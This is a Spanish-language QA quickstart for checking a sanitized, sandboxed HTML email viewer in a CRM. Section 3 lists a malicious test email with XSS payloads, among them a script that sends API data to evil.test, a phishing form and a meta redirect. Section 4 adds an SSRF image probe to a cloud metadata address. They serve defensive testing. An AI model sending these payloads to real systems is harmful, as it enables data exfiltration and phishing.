# Quickstart: validar la vista segura de correos HTML

Detalle de datos y rutas: [data-model.md](./data-model.md), [contracts/](./contracts/).

## Prerrequisitos

```bash
npm install                       # agrega sanitize-html; repone mailparser/imapflow si faltan
npx prisma generate
npm run db:migrate                # aplica 20261117000000_correo_html_seguro
```

En `.env`: `CORREO_VISTA_SECRETO`, con al menos 32 bytes aleatorios
(`node -e "console.log(require('crypto').randomBytes(48).toString('base64url'))"`).

Levantar la app y el worker: `npm run dev:full`. Tener un buzón de correo conectado (feature 034).

## 1. Pruebas automáticas

```bash
npx vitest run src/integraciones/email          # limpieza, normalización, token, proxy, documento
npx vitest run src/worker/grafo-importaciones.test.ts
npx vitest run src/app/api/correo               # 404 por otro comercio, token alterado o vencido
npm run test:e2e -- tests/e2e/conversaciones/correo-html-seguro.spec.ts
```

**Esperado**: todo en verde. Los catálogos de `contracts/limpieza-html.md` y `contracts/proxy-imagenes.md`
deben estar cubiertos caso por caso.

## 2. Correo HTML normal (US1, US4)

Enviar al buzón un correo comercial con un logo `cid:`, una tabla, una lista y colores.

**Esperado:**
- En el Inbox, la tarjeta expandida muestra el correo sobre una hoja clara, con "Vista previa (HTML)"
  seleccionado.
- El desplazamiento interno funciona **sin barra visible**.
- El logo cid se ve.
- "Texto plano" muestra el texto seleccionable.
- "Ampliar" abre la vista grande.

## 3. Correo malicioso (US1) — verificar en un navegador real

Enviar un correo con este HTML (por ejemplo, con `swaks --attach-type text/html`):

```html
<img src=x onerror="parent.document.body.innerHTML='PWNED'">
<script>fetch('/api/conversaciones').then(r=>r.text()).then(t=>top.location='https://evil.test/?'+t)</script>
<a href="javascript:alert(1)">js</a> <a href="https://example.com">ok</a>
<form action="https://evil.test"><input name=p><button>Enviar</button></form>
<div style="position:fixed;inset:0;background:red">Inicie sesión de nuevo</div>
<svg onload="alert(1)"></svg><iframe src="/crm"></iframe>
<meta http-equiv="refresh" content="0;url=https://evil.test">
<img src="https://tracker.test/pixel.gif" width=1 height=1>
```

**Esperado**, con DevTools abierto:
- **Elements**: dentro del iframe no hay `script`, `on*`, `form`, `svg`, `iframe`, `meta` ni
  `href="javascript:"`. El `div` no tiene `position:fixed`.
- **Console**: no hay alertas. Si hay errores, son solo de CSP o sandbox.
- **Network**: al abrir el correo no hay ninguna petición a `tracker.test`, `evil.test` ni
  `/api/conversaciones` desde el iframe.
- La página de Karia no cambió y la ventana principal no navegó.
- El clic en el enlace `https://example.com` abre una pestaña nueva (research R5.1), y en
  ella `document.referrer` está vacío y `window.opener` es `null`.
- En la consola del iframe, `document.cookie` lanza `SecurityError` (origen opaco).
- **Cabeceras de la respuesta** `/api/correo-aislado/vista`: CSP, `nosniff`, `no-referrer` y `no-store`,
  exactas según research R7.

## 4. Imágenes externas (US3)

Enviar un correo con `<img src="https://picsum.photos/200">` y con `<img src="http://169.254.169.254/x">`.

**Esperado:**
- Al abrirlo aparece el aviso "Este correo contiene imágenes externas que se han bloqueado por seguridad"
  y no hay peticiones externas.
- "Cargar imágenes" muestra la primera, servida desde `/api/correo-aislado/imagen`. La segunda queda como
  no disponible.
- En el log del servidor aparece el motivo `DIRECCION_BLOQUEADA`.

## 5. Otro comercio (FR-015)

1. Con la sesión de un usuario del comercio A, copiar `urlVista` de la respuesta de
   `GET /api/correo/mensajes/{id}`.
2. Con la sesión del comercio B, pedir `GET /api/correo/mensajes/{id}`.
3. Alterar un carácter del token de `urlVista`.
4. Esperar 16 minutos y volver a usar `urlVista`.

**Esperado**: 404 en los pasos 2, 3 y 4.

## 6. Cabeceras y correos viejos (US2, FR-029)

- Un correo con varios Para y CC y un asunto distinto muestra exactamente esos datos.
- Un correo recibido antes de la migración se ve igual que hoy, en texto y sin selector.

## 7. No regresión (FR-028, FR-030)

- `npm run test:e2e:conversaciones` sigue en verde.
- Enviar un mensaje por WhatsApp o Instagram: se ve igual que antes.
- Responder un correo: sale en texto, con "Re:" y en el mismo hilo, y su tarjeta muestra De = buzón.
